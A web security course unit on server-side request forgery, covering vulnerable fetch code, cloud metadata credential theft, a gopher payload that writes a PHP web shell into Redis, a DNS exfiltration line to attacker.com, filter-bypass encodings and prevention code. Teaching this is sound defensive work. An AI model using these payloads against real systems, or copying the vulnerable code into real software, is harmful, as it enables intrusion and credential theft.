# Unit 10: Other Web Vulnerabilities - Topic 3: Server-Side Request Forgery (SSRF)

## Overview

Server-Side Request Forgery (SSRF) is a vulnerability that allows an attacker to induce the server-side application to make HTTP requests to an arbitrary domain or internal resource of the attacker's choosing. SSRF exploits trust relationships — the server often has access to internal networks, cloud metadata services, and backend systems that are not directly accessible from the internet. SSRF was added to the **OWASP Top 10 (2021)** as a standalone category, reflecting its growing criticality in cloud environments.

---

## 1. SSRF Fundamentals

### How SSRF Works

```
Normal Operation:
┌──────────┐    Request: fetch URL     ┌──────────┐    HTTP Request    ┌──────────────┐
│  Client  │ ─────────────────────►   │  Server  │ ────────────────► │ External API │
│          │   url=https://api.com    │  (Web    │                   │ (Legitimate) │
│          │ ◄─────────────────────   │   App)   │ ◄──────────────── │              │
└──────────┘    Response              └──────────┘    Response        └──────────────┘

SSRF Attack:
┌──────────┐    Request: fetch URL     ┌──────────┐    HTTP Request    ┌──────────────┐
│ Attacker │ ─────────────────────►   │  Server  │ ────────────────► │ Internal     │
│          │   url=http://169.254.    │  (Web    │                   │ Service /    │
│          │   169.254/metadata      │   App)   │                   │ Cloud Meta   │
│          │ ◄─────────────────────   │          │ ◄──────────────── │ (RESTRICTED) │
└──────────┘    Internal Data!        └──────────┘    Sensitive Data  └──────────────┘

Key Insight: The SERVER makes the request, so it has:
  ✓ Access to internal network (10.x, 172.x, 192.168.x)
  ✓ Access to cloud metadata (169.254.169.254)
  ✓ Access to localhost services (127.0.0.1)
  ✓ Bypass of firewall rules (server is "trusted")
  ✓ Different DNS resolution (internal DNS)
```

### Common SSRF Injection Points

| Location | Example | Description |
|----------|---------|-------------|
| **URL parameters** | `?url=http://...` | Direct URL fetch |
| **File imports** | `?import=http://...` | Import from URL |
| **Webhooks** | Callback URL configuration | Server sends data to URL |
| **PDF generators** | HTML with external resources | wkhtmltopdf, Puppeteer |
| **Image processors** | Image URL for resize/crop | ImageMagick, Pillow |
| **XML parsing** | XXE with external entities | DTD fetching |
| **File upload** | SVG with external references | SVG image processing |
| **Email functionality** | SMTP server configuration | Mail relay |
| **API integrations** | Third-party API URLs | Custom API endpoints |
| **Proxy functionality** | Proxy URL parameter | Request forwarding |

### Vulnerable Code Examples

**Python (Flask):**
```python
# Vulnerable - user controls the URL
import requests

@app.route('/fetch')
def fetch():
    url = request.args.get('url')
    response = requests.get(url)  # SSRF!
    return response.text
```

**PHP:**
```php
// Vulnerable - user controls URL for file_get_contents
$url = $_GET['url'];
$content = file_get_contents($url);  // SSRF!
echo $content;

// Also vulnerable with curl
$ch = curl_init($_GET['url']);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
$response = curl_exec($ch);
```

**Node.js:**
```javascript
// Vulnerable
app.get('/proxy', async (req, res) => {
    const url = req.query.url;
    const response = await fetch(url);  // SSRF!
    const data = await response.text();
    res.send(data);
});
```

---

## 2. Basic SSRF Exploitation

### 2.1 Accessing Internal Services

```bash
# Localhost services
GET /fetch?url=http://127.0.0.1:80/admin
GET /fetch?url=http://127.0.0.1:8080/manager
GET /fetch?url=http://127.0.0.1:3306/    # MySQL
GET /fetch?url=http://127.0.0.1:6379/    # Redis
GET /fetch?url=http://127.0.0.1:9200/    # Elasticsearch
GET /fetch?url=http://127.0.0.1:27017/   # MongoDB
GET /fetch?url=http://127.0.0.1:11211/   # Memcached

# Internal network scanning
GET /fetch?url=http://10.0.0.1/
GET /fetch?url=http://192.168.1.1/
GET /fetch?url=http://172.16.0.1/

# Internal hostnames
GET /fetch?url=http://intranet.internal/
GET /fetch?url=http://jenkins.internal:8080/
GET /fetch?url=http://gitlab.internal/
```

### 2.2 Cloud Metadata Services

**AWS (IMDSv1):**
```bash
# AWS Instance Metadata Service
GET /fetch?url=http://169.254.169.254/latest/meta-data/
GET /fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/
GET /fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/[ROLE-NAME]
GET /fetch?url=http://169.254.169.254/latest/user-data
GET /fetch?url=http://169.254.169.254/latest/meta-data/hostname
GET /fetch?url=http://169.254.169.254/latest/meta-data/local-ipv4

# Response contains:
# {
#   "AccessKeyId": "AKIA...",
#   "SecretAccessKey": "...",
#   "Token": "...",
#   "Expiration": "2024-..."
# }
# These credentials can be used to access AWS services!
```

**AWS (IMDSv2 — Token Required):**
```bash
# IMDSv2 requires a token first
# Step 1: Get token (requires PUT with custom header)
PUT http://169.254.169.254/latest/api/token
X-aws-ec2-metadata-token-ttl-seconds: 21600

# Step 2: Use token to access metadata
GET http://169.254.169.254/latest/meta-data/
X-aws-ec2-metadata-token: [TOKEN]

# IMDSv2 is harder to exploit via SSRF because most SSRF
# vectors don't allow custom headers on the forged request
```

**Google Cloud:**
```bash
# GCP Metadata Service (requires header)
GET /fetch?url=http://metadata.google.internal/computeMetadata/v1/
# Requires: Metadata-Flavor: Google

# If header can be injected:
GET /fetch?url=http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
GET /fetch?url=http://metadata.google.internal/computeMetadata/v1/project/project-id
GET /fetch?url=http://metadata.google.internal/computeMetadata/v1/instance/attributes/
```

**Azure:**
```bash
# Azure Instance Metadata Service
GET /fetch?url=http://169.254.169.254/metadata/instance?api-version=2021-02-01
# Requires: Metadata: true

# Azure management token
GET /fetch?url=http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/
```

**DigitalOcean:**
```bash
GET /fetch?url=http://169.254.169.254/metadata/v1/
GET /fetch?url=http://169.254.169.254/metadata/v1/id
GET /fetch?url=http://169.254.169.254/metadata/v1/user-data
```

### Cloud Metadata Endpoints Summary

| Provider | Endpoint | Header Required |
|----------|----------|-----------------|
| **AWS IMDSv1** | `169.254.169.254/latest/meta-data/` | None |
| **AWS IMDSv2** | `169.254.169.254/latest/meta-data/` | Token (PUT first) |
| **GCP** | `metadata.google.internal/computeMetadata/v1/` | `Metadata-Flavor: Google` |
| **Azure** | `169.254.169.254/metadata/instance` | `Metadata: true` |
| **DigitalOcean** | `169.254.169.254/metadata/v1/` | None |
| **Oracle Cloud** | `169.254.169.254/opc/v2/` | `Authorization: Bearer Oracle` |
| **Alibaba** | `100.100.100.200/latest/meta-data/` | None |

---

## 3. Advanced SSRF Techniques

### 3.1 Protocol Smuggling

SSRF isn't limited to HTTP — many URL handlers support multiple protocols:

```bash
# File protocol - read local files
GET /fetch?url=file:///etc/passwd
GET /fetch?url=file:///c:/windows/win.ini

# Gopher protocol - interact with TCP services
# Redis - write web shell
GET /fetch?url=gopher://127.0.0.1:6379/_SET%20shell%20%22%3C%3Fphp%20system%28%24_GET%5B%27cmd%27%5D%29%3B%3F%3E%22%0D%0ACONFIG%20SET%20dir%20/var/www/html%0D%0ACONFIG%20SET%20dbfilename%20shell.php%0D%0ASAVE%0D%0A

# Dict protocol - interact with services
GET /fetch?url=dict://127.0.0.1:6379/INFO

# FTP protocol
GET /fetch?url=ftp://internal-ftp.company.com/

# LDAP protocol
GET /fetch?url=ldap://127.0.0.1:389/
```

**Gopher Protocol - Detailed Redis Attack:**
```bash
# Step 1: Create gopher payload for Redis
# Commands to execute:
#   SET shell "<?php system($_GET['cmd']); ?>"
#   CONFIG SET dir /var/www/html
#   CONFIG SET dbfilename shell.php
#   SAVE

# Generate gopher URL (URL-encode CRLF as %0D%0A)
gopher://127.0.0.1:6379/_*3%0D%0A$3%0D%0ASET%0D%0A$5%0D%0Ashell%0D%0A$31%0D%0A<?php system($_GET['cmd']); ?>%0D%0A*4%0D%0A$6%0D%0ACONFIG%0D%0A$3%0D%0ASET%0D%0A$3%0D%0Adir%0D%0A$13%0D%0A/var/www/html%0D%0A*4%0D%0A$6%0D%0ACONFIG%0D%0A$3%0D%0ASET%0D%0A$10%0D%0Adbfilename%0D%0A$9%0D%0Ashell.php%0D%0A*1%0D%0A$4%0D%0ASAVE%0D%0A

# Tools to generate gopher payloads:
# Gopherus - https://github.com/tarunkant/Gopherus
python gopherus.py --exploit redis
python gopherus.py --exploit mysql
python gopherus.py --exploit smtp
```

### 3.2 DNS Rebinding

DNS rebinding bypasses IP-based SSRF filters by manipulating DNS resolution:

```
┌──────────┐                      ┌──────────┐                   ┌─────────────┐
│ Attacker │                      │  Server  │                   │ Attacker's  │
│          │                      │          │                   │ DNS Server  │
└────┬─────┘                      └────┬─────┘                   └──────┬──────┘
     │ 1. Submit URL:                  │                                │
     │    evil.attacker.com            │                                │
     │────────────────────────────────►│                                │
     │                                 │ 2. DNS lookup:                 │
     │                                 │    evil.attacker.com           │
     │                                 │───────────────────────────────►│
     │                                 │                                │
     │                                 │ 3. Response: 1.2.3.4           │
     │                                 │◄───────────────────────────────│
     │                                 │                                │
     │                                 │ 4. IP check: 1.2.3.4          │
     │                                 │    NOT internal ✓ PASS         │
     │                                 │                                │
     │                                 │ 5. DNS lookup again:           │
     │                                 │    evil.attacker.com           │
     │                                 │───────────────────────────────►│
     │                                 │                                │
     │                                 │ 6. Response: 127.0.0.1 !!!    │
     │                                 │◄───────────────────────────────│
     │                                 │                                │
     │                                 │ 7. Connects to 127.0.0.1      │
     │                                 │    SSRF SUCCESSFUL!            │
```

**Tools for DNS Rebinding:**
```bash
# rbndr - DNS rebinding service
# Visit: https://lock.cmpxchg8b.com/rebinder.html
# Configure: First IP = allowed IP, Second IP = target internal IP

# Singularity of Origin
# https://github.com/nccgroup/singularity
# Full-featured DNS rebinding attack framework

# Use short TTL DNS services
# rebind.it, 1u.ms, nip.io with custom DNS
```

### 3.3 Blind SSRF

When the server doesn't return the response content:

```bash
# Detection via out-of-band (OOB)
# Use Burp Collaborator or interact.sh
GET /fetch?url=http://BURP-COLLABORATOR-SUBDOMAIN.oastify.com

# Time-based detection
# Compare response times for accessible vs inaccessible hosts
GET /fetch?url=http://127.0.0.1:80/     # Fast = port open
GET /fetch?url=http://127.0.0.1:12345/  # Slow = port closed (timeout)

# Status-based detection
GET /fetch?url=http://127.0.0.1:22/     # Different error = SSH running
GET /fetch?url=http://127.0.0.1:3306/   # Different error = MySQL running
```

**Blind SSRF Exploitation via Out-of-Band:**
```bash
# Using interact.sh
interactsh-client

# Test with generated domain
GET /fetch?url=http://abc123.interact.sh

# Monitor for incoming DNS/HTTP requests
# If interaction received → SSRF confirmed

# Exfiltrate data via DNS (if response reflected in URL)
GET /fetch?url=http://$(cat /etc/hostname).attacker.com
```

---

## 4. SSRF Filter Bypass Techniques

### 4.1 IP Address Representations

```bash
# Decimal representation
http://2130706433/          # = 127.0.0.1
http://3232235777/          # = 192.168.1.1

# Hex representation
http://0x7f000001/          # = 127.0.0.1
http://0x7f.0x0.0x0.0x1/   # = 127.0.0.1

# Octal representation
http://0177.0.0.01/         # = 127.0.0.1
http://0177.0000.0000.0001/ # = 127.0.0.1

# Mixed notation
http://0x7f.0.0.1/          # Hex + decimal
http://0177.0.0.1/          # Octal + decimal

# IPv6
http://[::1]/               # = 127.0.0.1
http://[0:0:0:0:0:0:0:1]/  # = 127.0.0.1
http://[::ffff:127.0.0.1]/ # IPv4-mapped IPv6
http://[0000::1]/           # = 127.0.0.1

# Shortened IPv4
http://127.1/               # = 127.0.0.1
http://127.0.1/             # = 127.0.0.1

# Zero (resolves to localhost on many systems)
http://0/
http://0.0.0.0/
```

### 4.2 URL Parsing Bypasses

```bash
# Authority confusion
http://attacker.com@127.0.0.1/          # Userinfo before host
http://127.0.0.1#@attacker.com/         # Fragment confusion
http://127.0.0.1%23@attacker.com/       # Encoded #

# Enclosed alphanumerics (Unicode)
http://①②⑦.⓪.⓪.①/                      # Unicode numbers

# URL shorteners (if external URLs allowed)
http://tinyurl.com/xyz → http://127.0.0.1/

# Redirect-based bypass
# Attacker hosts redirect:
# http://evil.com/redirect → 302 → http://127.0.0.1/
GET /fetch?url=http://evil.com/redirect

# Double URL encoding
http://127.0.0.1  →  http://%31%32%37%2e%30%2e%30%2e%31
```

### 4.3 DNS-Based Bypasses

```bash
# Custom DNS pointing to internal IP
# A record: ssrf.attacker.com → 127.0.0.1
GET /fetch?url=http://ssrf.attacker.com/

# Wildcard DNS services
http://127.0.0.1.nip.io/
http://127.0.0.1.sslip.io/
http://127.0.0.1.xip.io/
http://localtest.me/              # Always resolves to 127.0.0.1
http://spoofed.burpcollaborator.net/

# AWS-specific
http://169.254.169.254.nip.io/    # Cloud metadata via nip.io
```

### 4.4 Redirect-Based Bypass

```python
# Host a redirect service on attacker server
from flask import Flask, redirect

app = Flask(__name__)

@app.route('/redirect')
def ssrf_redirect():
    return redirect('http://169.254.169.254/latest/meta-data/')

@app.route('/internal')
def internal_redirect():
    return redirect('http://127.0.0.1:8080/admin')

# The server follows the redirect to the internal resource
```

### Bypass Techniques Summary

| Technique | Example | Bypasses |
|-----------|---------|----------|
| Decimal IP | `http://2130706433/` | String matching for "127.0.0.1" |
| Hex IP | `http://0x7f000001/` | Decimal IP filters |
| Octal IP | `http://0177.0.0.01/` | Standard notation filters |
| IPv6 | `http://[::1]/` | IPv4-only filters |
| Short IP | `http://127.1/` | Full notation filters |
| DNS pointing | `evil.com → 127.0.0.1` | IP-based allow/deny lists |
| nip.io | `127.0.0.1.nip.io` | Hostname-based filters |
| Redirect | `evil.com/redir → 127.0.0.1` | URL validation (pre-request) |
| DNS rebinding | TTL=0 dual response | IP validation + DNS cache |
| URL encoding | `%31%32%37%2e%30%2e%30%2e%31` | String matching |
| @ symbol | `evil.com@127.0.0.1` | Hostname parsing confusion |

---

## 5. Real-World SSRF Examples

### Capital One Breach (2019)

```
Attack Flow:
1. Attacker found SSRF in Capital One's WAF (ModSecurity on AWS)
2. Used SSRF to access AWS metadata service:
   http://169.254.169.254/latest/meta-data/iam/security-credentials/
3. Obtained IAM role credentials (AccessKeyId, SecretAccessKey, Token)
4. Used credentials to access S3 buckets
5. Exfiltrated 100+ million customer records

Impact: $80 million fine, 100M+ records exposed
Root Cause: Misconfigured WAF + IMDSv1 (no token required)
Fix: AWS released IMDSv2 (token-based)
```

### GitLab SSRF (CVE-2021-22214)

```
Vulnerability: SSRF via project import feature
Attack: Import from URL → internal network access
Impact: Access to internal services, cloud metadata
```

---

## 6. SSRF Testing Methodology

### Step-by-Step Testing Process

```
┌──────────────────────────────────────────┐
│ Step 1: Identify SSRF Injection Points   │
│ - URL parameters, webhooks, file imports │
│ - PDF generators, image processors       │
│ - Any feature that fetches external URLs │
├──────────────────────────────────────────┤
│ Step 2: Test Basic SSRF                  │
│ - Burp Collaborator / interact.sh       │
│ - http://COLLABORATOR.oastify.com       │
│ - Confirm server makes outbound request  │
├──────────────────────────────────────────┤
│ Step 3: Test Internal Access             │
│ - http://127.0.0.1/                     │
│ - http://localhost/                      │
│ - Cloud metadata endpoints              │
├──────────────────────────────────────────┤
│ Step 4: Enumerate Filters                │
│ - What's blocked? IPs? Protocols?       │
│ - Test bypass techniques systematically  │
├──────────────────────────────────────────┤
│ Step 5: Bypass Filters                   │
│ - IP encoding, DNS tricks, redirects    │
│ - Protocol handlers (gopher, dict, file) │
├──────────────────────────────────────────┤
│ Step 6: Exploit                          │
│ - Port scan internal network            │
│ - Access internal services              │
│ - Extract cloud credentials             │
│ - Chain with other vulnerabilities      │
└──────────────────────────────────────────┘
```

### Automated SSRF Tools

```bash
# SSRFmap - Automatic SSRF fuzzer and exploitation
git clone https://github.com/swisskyrepo/SSRFmap
python3 ssrfmap.py -r request.txt -p url -m readfiles
python3 ssrfmap.py -r request.txt -p url -m portscan
python3 ssrfmap.py -r request.txt -p url -m redis

# Gopherus - Generate gopher payloads
python gopherus.py --exploit redis
python gopherus.py --exploit mysql  
python gopherus.py --exploit fastcgi
python gopherus.py --exploit smtp

# Ground Control - Collaborator alternative
# For OOB SSRF detection
```

---

## 7. Prevention Techniques

### Application-Level Controls

```python
import ipaddress
import socket
from urllib.parse import urlparse

BLOCKED_NETWORKS = [
    ipaddress.ip_network('127.0.0.0/8'),       # Loopback
    ipaddress.ip_network('10.0.0.0/8'),         # Private
    ipaddress.ip_network('172.16.0.0/12'),      # Private
    ipaddress.ip_network('192.168.0.0/16'),     # Private
    ipaddress.ip_network('169.254.0.0/16'),     # Link-local/metadata
    ipaddress.ip_network('0.0.0.0/8'),          # This network
    ipaddress.ip_network('::1/128'),            # IPv6 loopback
    ipaddress.ip_network('fc00::/7'),           # IPv6 private
]

def is_safe_url(url):
    """Validate URL is safe from SSRF"""
    parsed = urlparse(url)
    
    # 1. Protocol whitelist
    if parsed.scheme not in ('http', 'https'):
        return False
    
    # 2. Resolve hostname to IP
    try:
        ip = socket.getaddrinfo(parsed.hostname, None)[0][4][0]
        ip_obj = ipaddress.ip_address(ip)
    except (socket.gaierror, ValueError):
        return False
    
    # 3. Check against blocked networks
    for network in BLOCKED_NETWORKS:
        if ip_obj in network:
            return False
    
    # 4. Re-resolve at request time (prevent DNS rebinding)
    # Pin the resolved IP for the actual request
    return True
```

### Infrastructure-Level Controls

| Control | Description |
|---------|-------------|
| **IMDSv2** | Require token for AWS metadata (blocks SSRF) |
| **Network segmentation** | Isolate application servers from internal services |
| **Egress filtering** | Restrict outbound traffic from application servers |
| **Disable unnecessary protocols** | Block gopher, dict, file, ftp |
| **Internal firewall** | Block metadata IP (169.254.169.254) from app servers |
| **VPC endpoints** | Use private endpoints instead of public for AWS services |
| **Service mesh** | mTLS between microservices |

---

## Summary Table

| Concept | Key Points |
|---------|------------|
| **Basic SSRF** | Server makes request to attacker-specified URL |
| **Cloud Metadata** | 169.254.169.254 — access IAM credentials, instance info |
| **Blind SSRF** | No response returned; use OOB (Collaborator, interact.sh) |
| **Protocol Smuggling** | gopher://, dict://, file:// for non-HTTP attacks |
| **DNS Rebinding** | Bypass IP validation by changing DNS response |
| **IP Bypass** | Decimal, hex, octal, IPv6, shortened notations |
| **Redirect Bypass** | Host redirect on attacker server to internal target |
| **Prevention** | URL validation, IP blocklist, egress filtering, IMDSv2 |

---

## Revision Questions

1. Explain how SSRF differs from other injection attacks. Why is it particularly dangerous in cloud environments?
2. Describe the Capital One breach. What role did SSRF play, and how does IMDSv2 mitigate this attack?
3. What is DNS rebinding and how does it bypass IP-based SSRF filters?
4. Explain how the Gopher protocol can be used to exploit SSRF to attack internal Redis instances.
5. List five different techniques to bypass SSRF IP filters and explain the principle behind each.
6. Design a defense-in-depth strategy against SSRF for a cloud-native application.

---

*Previous: [02-path-traversal.md](02-path-traversal.md) | Next: [04-deserialization-vulnerabilities.md](04-deserialization-vulnerabilities.md)*

---

*[Back to README](../README.md)*
